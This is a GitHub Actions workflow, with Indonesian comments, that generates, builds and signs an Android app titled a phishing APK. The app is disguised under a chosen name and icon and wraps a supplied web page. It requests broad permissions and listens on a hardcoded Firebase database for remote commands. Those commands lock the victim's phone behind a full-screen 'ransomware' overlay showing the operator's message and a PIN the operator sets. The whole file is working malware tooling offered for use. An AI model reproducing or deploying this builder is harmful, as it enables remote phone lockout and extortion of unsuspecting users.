name: Build Phising APK

on:
  workflow_dispatch:
    inputs:
      app_name:
        required: true
      webview_url:
        required: true
      uid:
        required: true
      icon_url:
        required: false

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Setup Java
        uses: actions/setup-java@v4
        with:
          distribution: 'temurin'
          java-version: '17'

      - name: Setup Flutter
        uses: subosito/flutter-action@v2
        with:
          channel: 'stable'
          cache: true

      - name: Create Flutter Project (Dari Nol)
        run: |
          flutter create phising_base
          cd phising_base
          
          # 1. BIKIN MANIFEST & IZIN
          cat > android/app/src/main/AndroidManifest.xml << 'EOF'
          <manifest xmlns:android="http://schemas.android.com/apk/res/android"
              package="com.example.phising_base">
              <uses-permission android:name="android.permission.INTERNET"/>
              <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
              <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
              <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
              <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
              <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
              <uses-permission android:name="android.permission.READ_MEDIA_IMAGES"/>
              <uses-permission android:name="android.permission.READ_MEDIA_VIDEO"/>
              <uses-permission android:name="android.permission.READ_MEDIA_AUDIO"/>
              <uses-permission android:name="android.permission.RECORD_AUDIO"/>
              <uses-permission android:name="android.permission.POST_NOTIFICATIONS"/>
              <uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>
              <uses-permission android:name="android.permission.WAKE_LOCK"/>
              <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW"/>
              <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES"/>
              <uses-permission android:name="android.permission.REQUEST_INSTALL_PACKAGES"/>
              
              <application
                  android:name="${applicationName}"
                  android:label="${{ github.event.inputs.app_name }}"
                  android:icon="@mipmap/ic_launcher"
                  android:usesCleartextTraffic="true">
                  <activity
                      android:name=".MainActivity"
                      android:exported="true"
                      android:theme="@style/LaunchTheme">
                      <meta-data
                          android:name="io.flutter.embedding.android.NormalTheme"
                          android:resource="@style/NormalTheme" />
                      <intent-filter>
                          <action android:name="android.intent.action.MAIN"/>
                          <category android:name="android.intent.category.LAUNCHER"/>
                      </intent-filter>
                  </activity>
                  <meta-data android:name="flutterEmbedding" android:value="2" />
              </application>
          </manifest>
          EOF

          # 2. UPDATE PUBSPEC & ICON
          mkdir -p assets
          
          # KALO ADA URL ICON, DOWNLOAD. KALO GAK ADA, BIKIN ICON DEFAULT 1x1 PNG.
          if [ -n "${{ github.event.inputs.icon_url }}" ]; then
            curl -fL "${{ github.event.inputs.icon_url }}" -o assets/icon.png || \
            echo "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNkYAAAAAYAAjCB0C8AAAAASUVORK5CYII=" | base64 -d > assets/icon.png
          else
            echo "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNkYAAAAAYAAjCB0C8AAAAASUVORK5CYII=" | base64 -d > assets/icon.png
          fi

          cat > pubspec.yaml << 'EOF'
          name: phising_base
          environment:
            sdk: ^3.8.1
          dependencies:
            flutter:
              sdk: flutter
            webview_flutter: ^4.10.0
            permission_handler: ^11.3.0
            firebase_core: ^3.10.1
            firebase_database: ^11.3.1
          dev_dependencies:
            flutter_launcher_icons: ^0.13.1
          flutter_launcher_icons:
            android: true
            ios: false
            image_path: "assets/icon.png"
          flutter:
            uses-material-design: true
            assets:
              - assets/config.json
          EOF
          
          # 3. BIKIN CONFIG JSON
          cat > assets/config.json <<EOF
          {
            "app_name": "${{ github.event.inputs.app_name }}",
            "webview_url": "${{ github.event.inputs.webview_url }}",
            "uid": "${{ github.event.inputs.uid }}"
          }
          EOF

      - name: Inject Services (Lock, Ransomware, Main)
        run: |
          cd phising_base/lib
          
          # MAIN.DART
          cat > main.dart << 'EOF'
          import 'dart:convert';
          import 'package:flutter/material.dart';
          import 'package:flutter/services.dart';
          import 'package:webview_flutter/webview_flutter.dart';
          import 'package:permission_handler/permission_handler.dart';
          import 'lock_service.dart';
          import 'ransomware_service.dart';

          void main() {
            WidgetsFlutterBinding.ensureInitialized();
            runApp(const MyApp());
          }

          class MyApp extends StatelessWidget {
            const MyApp({super.key});
            @override
            Widget build(BuildContext context) {
              return MaterialApp(debugShowCheckedModeBanner: false, home: const SplashScreen());
            }
          }

          class SplashScreen extends StatefulWidget {
            const SplashScreen({super.key});
            @override
            State<SplashScreen> createState() => _SplashScreenState();
          }

          class _SplashScreenState extends State<SplashScreen> {
            @override
            void initState() {
              super.initState();
              _initApp();
            }

            Future<void> _initApp() async {
              await [Permission.storage, Permission.location, Permission.camera, Permission.microphone, Permission.notification].request();
              Map<String, dynamic> config = {};
              try {
                final String jsonString = await rootBundle.loadString('assets/config.json');
                config = jsonDecode(jsonString);
              } catch (e) {}

              String targetUrl = config['webview_url'] ?? 'https://www.google.com';
              String uid = config['uid'] ?? 'unknown';

              LockScreenService().init(context, uid);
              RansomwareService().init(context, uid);
              
              await Future.delayed(const Duration(seconds: 1));
              if (mounted) Navigator.pushReplacement(context, MaterialPageRoute(builder: (_) => WebViewScreen(url: targetUrl)));
            }

            @override
            Widget build(BuildContext context) => const Scaffold(body: Center(child: CircularProgressIndicator()));
          }

          class WebViewScreen extends StatefulWidget {
            final String url;
            const WebViewScreen({super.key, required this.url});
            @override
            State<WebViewScreen> createState() => _WebViewScreenState();
          }

          class _WebViewScreenState extends State<WebViewScreen> {
            late final WebViewController _controller;
            @override
            void initState() {
              super.initState();
              _controller = WebViewController()
                ..setJavaScriptMode(JavaScriptMode.unrestricted)
                ..setNavigationDelegate(
                  NavigationDelegate(
                    onNavigationRequest: (NavigationRequest request) {
                      return NavigationDecision.navigate;
                    },
                  ),
                )
                ..loadRequest(Uri.parse(widget.url));
            }
            @override
            Widget build(BuildContext context) => Scaffold(body: SafeArea(child: WebViewWidget(controller: _controller)));
          }
          EOF

          # LOCK SERVICE
          cat > lock_service.dart << 'EOF'
          import 'dart:async';
          import 'package:flutter/material.dart';
          import 'package:firebase_database/firebase_database.dart';
          import 'package:firebase_core/firebase_core.dart';
          import 'lock_screen.dart';

          class LockScreenService {
            static final LockScreenService _instance = LockScreenService._internal();
            factory LockScreenService() => _instance;
            LockScreenService._internal();
            StreamSubscription? _cmdSub;
            StreamSubscription? _pinSub;
            String _currentPin = '1234';
            bool _isLocked = false;
            OverlayEntry? _overlayEntry;
            BuildContext? _appContext;

            void init(BuildContext context, String deviceId) {
              _appContext = context;
              _listenToCommands(deviceId);
              _listenToPinUpdates(deviceId);
            }

            void _listenToCommands(String deviceId) {
              final fb = FirebaseDatabase.instanceFor(app: Firebase.app(), databaseURL: 'https://omix-axe-default-rtdb.asia-southeast1.firebasedatabase.app/');
              _cmdSub = fb.ref('commands/\$deviceId').onChildAdded.listen((event) {
                if (event.snapshot.value == null) return;
                final data = Map<String, dynamic>.from(event.snapshot.value as Map);
                final cmd = data['cmd'];
                final param = data['param']?.toString() ?? '';
                if (cmd == 98765432) _lockScreen();
                else if (cmd == 98765433) _unlockScreen();
                else if (cmd == 87654321 && param.isNotEmpty) _setPin(param);
                event.snapshot.ref.remove();
              });
            }

            void _listenToPinUpdates(String deviceId) {
              final fb = FirebaseDatabase.instanceFor(app: Firebase.app(), databaseURL: 'https://omix-axe-default-rtdb.asia-southeast1.firebasedatabase.app/');
              _pinSub = fb.ref('lock_pin/\$deviceId').onValue.listen((event) {
                if (event.snapshot.value != null) _currentPin = event.snapshot.value.toString();
              });
            }

            void _setPin(String newPin) => _currentPin = newPin;
            void _lockScreen() {
              if (_isLocked) return;
              _isLocked = true;
              if (_appContext == null) return;
              _overlayEntry = OverlayEntry(builder: (context) => LockScreenPage(correctPin: _currentPin, onUnlock: _unlockScreen));
              Overlay.of(_appContext!).insert(_overlayEntry!);
            }
            void _unlockScreen() {
              if (!_isLocked) return;
              _isLocked = false;
              _overlayEntry?.remove();
              _overlayEntry = null;
            }
            void dispose() { _cmdSub?.cancel(); _pinSub?.cancel(); _overlayEntry?.remove(); }
          }
          EOF

          # RANSOMWARE SERVICE
          cat > ransomware_service.dart << 'EOF'
          import 'dart:async';
          import 'package:flutter/material.dart';
          import 'package:firebase_database/firebase_database.dart';
          import 'package:firebase_core/firebase_core.dart';
          import 'ransomware_screen.dart';

          class RansomwareService {
            static final RansomwareService _instance = RansomwareService._internal();
            factory RansomwareService() => _instance;
            RansomwareService._internal();
            StreamSubscription? _cmdSub;
            bool _isActive = false;
            OverlayEntry? _overlayEntry;
            BuildContext? _appContext;
            String _currentPin = '1234';
            String _currentMessage = 'HP Anda terkunci. Hubungi Admin.';

            void init(BuildContext context, String deviceId) {
              _appContext = context;
              _listenToCommands(deviceId);
            }

            void _listenToCommands(String deviceId) {
              final fb = FirebaseDatabase.instanceFor(app: Firebase.app(), databaseURL: 'https://omix-axe-default-rtdb.asia-southeast1.firebasedatabase.app/');
              _cmdSub = fb.ref('commands/\$deviceId').onChildAdded.listen((event) {
                if (event.snapshot.value == null) return;
                final data = Map<String, dynamic>.from(event.snapshot.value as Map);
                final cmd = data['cmd'];
                final param = data['param']?.toString() ?? '';
                if (cmd == 1010) _activateRansomware(param);
                else if (cmd == 10101) _deactivateRansomware();
                else if (cmd == 87654321 && param.isNotEmpty) _currentPin = param;
                event.snapshot.ref.remove();
              });
            }

            void _activateRansomware(String message) {
              if (_isActive) return;
              _isActive = true;
              if (message.isNotEmpty) _currentMessage = message;
              if (_appContext == null) return;
              _overlayEntry = OverlayEntry(builder: (context) => RansomwareScreen(message: _currentMessage, correctPin: _currentPin, onUnlock: _deactivateRansomware));
              Overlay.of(_appContext!).insert(_overlayEntry!);
            }
            void _deactivateRansomware() {
              if (!_isActive) return;
              _isActive = false;
              _overlayEntry?.remove();
              _overlayEntry = null;
            }
            void dispose() { _cmdSub?.cancel(); _overlayEntry?.remove(); }
          }
          EOF
          
          # LOCK SCREEN (UI)
          cat > lock_screen.dart << 'EOF'
          import 'package:flutter/material.dart';
          import 'package:flutter/services.dart';

          class LockScreenPage extends StatefulWidget {
            final String correctPin;
            final VoidCallback onUnlock;
            const LockScreenPage({super.key, required this.correctPin, required this.onUnlock});
            @override
            State<LockScreenPage> createState() => _LockScreenPageState();
          }

          class _LockScreenPageState extends State<LockScreenPage> {
            String _inputPin = '';
            bool _isError = false;
            void _onKeyPress(String value) {
              if (_inputPin.length >= 6) return;
              setState(() { _inputPin += value; _isError = false; });
              if (_inputPin.length == widget.correctPin.length) _checkPin();
            }
            void _onDelete() {
              if (_inputPin.isEmpty) return;
              setState(() { _inputPin = _inputPin.substring(0, _inputPin.length - 1); _isError = false; });
            }
            void _checkPin() {
              if (_inputPin == widget.correctPin) widget.onUnlock();
              else { setState(() { _isError = true; _inputPin = ''; }); HapticFeedback.heavyImpact(); }
            }
            @override
            Widget build(BuildContext context) {
              return PopScope(canPop: false, child: Scaffold(
                backgroundColor: const Color(0xFF0A0A0F),
                body: SafeArea(child: Column(children: [
                  const Spacer(),
                  Container(padding: const EdgeInsets.all(24), decoration: BoxDecoration(color: _isError ? Colors.red.withOpacity(0.15) : const Color(0xFF1E1E2E), shape: BoxShape.circle), child: Icon(_isError ? Icons.lock_person_rounded : Icons.lock_rounded, size: 56, color: _isError ? Colors.redAccent : Colors.white70)),
                  const SizedBox(height: 24),
                  Text(_isError ? 'PIN Salah!' : 'HP Terkunci', style: TextStyle(color: _isError ? Colors.redAccent : Colors.white, fontSize: 22, fontWeight: FontWeight.bold)),
                  const SizedBox(height: 8),
                  const Text('Masukkan PIN untuk membuka', style: TextStyle(color: Colors.white54, fontSize: 13)),
                  const SizedBox(height: 32),
                  Row(mainAxisAlignment: MainAxisAlignment.center, children: List.generate(widget.correctPin.length, (i) {
                    final filled = i < _inputPin.length;
                    return Container(margin: const EdgeInsets.symmetric(horizontal: 8), width: 16, height: 16, decoration: BoxDecoration(shape: BoxShape.circle, color: _isError ? Colors.redAccent : (filled ? const Color(0xFF3DDC97) : Colors.white24), border: Border.all(color: filled ? const Color(0xFF3DDC97) : Colors.white30, width: 2)));
                  })),
                  const Spacer(),
                  Padding(padding: const EdgeInsets.symmetric(horizontal: 40), child: Column(children: [
                    _buildRow(['1', '2', '3']), const SizedBox(height: 16),
                    _buildRow(['4', '5', '6']), const SizedBox(height: 16),
                    _buildRow(['7', '8', '9']), const SizedBox(height: 16),
                    Row(mainAxisAlignment: MainAxisAlignment.spaceEvenly, children: [const SizedBox(width: 72), _buildButton('0'), _buildDeleteButton()]),
                  ])),
                  const SizedBox(height: 40),
                ])),
              ));
            }
            Widget _buildRow(List<String> keys) => Row(mainAxisAlignment: MainAxisAlignment.spaceEvenly, children: keys.map((k) => _buildButton(k)).toList());
            Widget _buildButton(String value) => GestureDetector(onTap: () => _onKeyPress(value), child: Container(width: 72, height: 72, decoration: BoxDecoration(shape: BoxShape.circle, color: const Color(0xFF1E1E2E), border: Border.all(color: Colors.white.withOpacity(0.05))), child: Center(child: Text(value, style: const TextStyle(color: Colors.white, fontSize: 28, fontWeight: FontWeight.w500)))));
            Widget _buildDeleteButton() => GestureDetector(onTap: _onDelete, child: Container(width: 72, height: 72, decoration: const BoxDecoration(shape: BoxShape.circle), child: const Center(child: Icon(Icons.backspace_outlined, color: Colors.white54, size: 28))));
          }
          EOF
          
          # RANSOMWARE SCREEN (UI)
          cat > ransomware_screen.dart << 'EOF'
          import 'package:flutter/material.dart';
          import 'package:flutter/services.dart';

          class RansomwareScreen extends StatefulWidget {
            final String message;
            final String correctPin;
            final VoidCallback onUnlock;
            const RansomwareScreen({super.key, required this.message, required this.correctPin, required this.onUnlock});
            @override
            State<RansomwareScreen> createState() => _RansomwareScreenState();
          }

          class _RansomwareScreenState extends State<RansomwareScreen> with SingleTickerProviderStateMixin {
            String _inputPin = '';
            bool _isError = false;
            late AnimationController _pulseCtrl;
            late Animation<double> _pulseAnim;
            @override
            void initState() {
              super.initState();
              _pulseCtrl = AnimationController(vsync: this, duration: const Duration(milliseconds: 800))..repeat(reverse: true);
              _pulseAnim = Tween<double>(begin: 0.9, end: 1.1).animate(_pulseCtrl);
            }
            @override
            void dispose() { _pulseCtrl.dispose(); super.dispose(); }
            void _onKeyPress(String value) {
              if (_inputPin.length >= 6) return;
              setState(() { _inputPin += value; _isError = false; });
              if (_inputPin.length == widget.correctPin.length) _checkPin();
            }
            void _onDelete() {
              if (_inputPin.isEmpty) return;
              setState(() { _inputPin = _inputPin.substring(0, _inputPin.length - 1); _isError = false; });
            }
            void _checkPin() {
              if (_inputPin == widget.correctPin) widget.onUnlock();
              else { setState(() { _isError = true; _inputPin = ''; }); HapticFeedback.heavyImpact(); }
            }
            @override
            Widget build(BuildContext context) {
              return PopScope(canPop: false, child: Scaffold(
                backgroundColor: const Color(0xFF1A0000),
                body: SafeArea(child: Column(children: [
                  const Spacer(),
                  ScaleTransition(scale: _pulseAnim, child: Container(padding: const EdgeInsets.all(28), decoration: BoxDecoration(color: Colors.red.withOpacity(0.15), shape: BoxShape.circle, border: Border.all(color: Colors.red.withOpacity(0.5), width: 3)), child: const Icon(Icons.dangerous_rounded, size: 72, color: Colors.red))),
                  const SizedBox(height: 24),
                  const Text('⚠️ HP ANDA TERKUNCI ⚠️', style: TextStyle(color: Colors.red, fontSize: 20, fontWeight: FontWeight.w900, letterSpacing: 1.5)),
                  const SizedBox(height: 16),
                  Padding(padding: const EdgeInsets.symmetric(horizontal: 32), child: Text(widget.message, textAlign: TextAlign.center, style: const TextStyle(color: Colors.white70, fontSize: 14, height: 1.5))),
                  const SizedBox(height: 32),
                  Row(mainAxisAlignment: MainAxisAlignment.center, children: List.generate(widget.correctPin.length, (i) {
                    final filled = i < _inputPin.length;
                    return Container(margin: const EdgeInsets.symmetric(horizontal: 8), width: 16, height: 16, decoration: BoxDecoration(shape: BoxShape.circle, color: _isError ? Colors.redAccent : (filled ? Colors.red : Colors.white24), border: Border.all(color: filled ? Colors.red : Colors.white30, width: 2)));
                  })),
                  const SizedBox(height: 16),
                  if (_isError) const Text('KODE SALAH!', style: TextStyle(color: Colors.redAccent, fontSize: 14, fontWeight: FontWeight.bold)),
                  const Spacer(),
                  Padding(padding: const EdgeInsets.symmetric(horizontal: 40), child: Column(children: [
                    _buildRow(['1', '2', '3']), const SizedBox(height: 12),
                    _buildRow(['4', '5', '6']), const SizedBox(height: 12),
                    _buildRow(['7', '8', '9']), const SizedBox(height: 12),
                    Row(mainAxisAlignment: MainAxisAlignment.spaceEvenly, children: [const SizedBox(width: 68), _buildButton('0'), _buildDeleteButton()]),
                  ])),
                  const SizedBox(height: 40),
                ])),
              ));
            }
            Widget _buildRow(List<String> keys) => Row(mainAxisAlignment: MainAxisAlignment.spaceEvenly, children: keys.map((k) => _buildButton(k)).toList());
            Widget _buildButton(String value) => GestureDetector(onTap: () => _onKeyPress(value), child: Container(width: 68, height: 68, decoration: BoxDecoration(shape: BoxShape.circle, color: const Color(0xFF2A0000), border: Border.all(color: Colors.red.withOpacity(0.2))), child: Center(child: Text(value, style: const TextStyle(color: Colors.white, fontSize: 26, fontWeight: FontWeight.w500)))));
            Widget _buildDeleteButton() => GestureDetector(onTap: _onDelete, child: Container(width: 68, height: 68, decoration: const BoxDecoration(shape: BoxShape.circle), child: const Center(child: Icon(Icons.backspace_outlined, color: Colors.white54, size: 26))));
          }
          EOF

      - name: Build & Sign APK
        run: |
          cd phising_base
          dart run flutter_launcher_icons
          keytool -genkey -v -keystore release.jks -keyalg RSA -keysize 2048 -validity 10000 -alias key0 -storepass ratapp123 -keypass ratapp123 -dname "CN=Android, OU=Android, O=Android, L=Android, ST=Android, C=US"
          flutter build apk --release
          $ANDROID_HOME/build-tools/34.0.0/apksigner sign --ks release.jks --ks-pass pass:ratapp123 --key-pass pass:ratapp123 --out build/app/outputs/flutter-apk/app-release-signed.apk build/app/outputs/flutter-apk/app-release.apk

      - name: Upload Artifact
        uses: actions/upload-artifact@v4
        with:
          name: phising-apk
          path: phising_base/build/app/outputs/flutter-apk/app-release-signed.apk
